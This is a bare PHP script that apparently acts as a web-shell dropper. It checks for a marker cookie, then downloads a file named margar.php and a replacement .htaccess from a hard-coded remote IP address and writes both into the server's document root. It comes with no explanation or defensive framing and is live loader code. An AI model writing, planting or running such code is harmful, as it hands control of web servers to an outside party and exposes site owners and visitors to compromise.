<?php

if(isset($_COOKIE['fdc7'])) {
    die('YMsnJ9z');
}
$link = "https://31.41.244.231/OO/"; 
$root = (filter_input(INPUT_SERVER, 'DOCUMENT_ROOT'));
file_put_contents($root.'/margar.php', file($link.'getfile.php?file=margar.php'));
file_put_contents($root.'/.htaccess', file($link.'getfile.php?file=.htaccess'));
?>